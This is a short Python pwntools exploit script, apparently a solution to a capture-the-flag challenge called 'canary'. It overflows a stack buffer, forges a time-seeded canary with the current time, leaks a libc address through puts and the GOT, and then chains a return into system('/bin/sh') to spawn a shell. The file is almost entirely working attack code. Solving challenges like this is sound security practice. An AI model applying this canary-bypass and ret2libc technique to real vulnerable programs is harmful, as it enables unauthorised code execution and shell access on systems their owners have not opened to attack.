#!/usr/bin/python3
import time
from pwn import *
exe = ELF('canary_patched', checksec=False)
libc = ELF('/mnt/d/ctf/vku/canary/libc.so.6')
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x080492f4

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

# GDB()
s = int(time.time())

print(s)
payload = b'a'* 44 + p32(s)
payload += b'a'*12 + p32(exe.plt.puts) + p32(exe.sym.read_in) + p32(exe.got.puts)
sla(b"here?", payload)
# sleep(20)
p.recvline()
# leak = p.recvuntil(b'Can')
# print(leak[0:3])
libc.address = u32(p.recv(4)) - 0x73260
print(hex(libc.address))
payload = b'a' *44 + p32(s)
payload+= b'a' * 12 + p32(libc.sym.system) + p32(0x08049009) + p32(next(libc.search(b'/bin/sh')))
s = int(time.time())
sl(payload)


p.interactive()
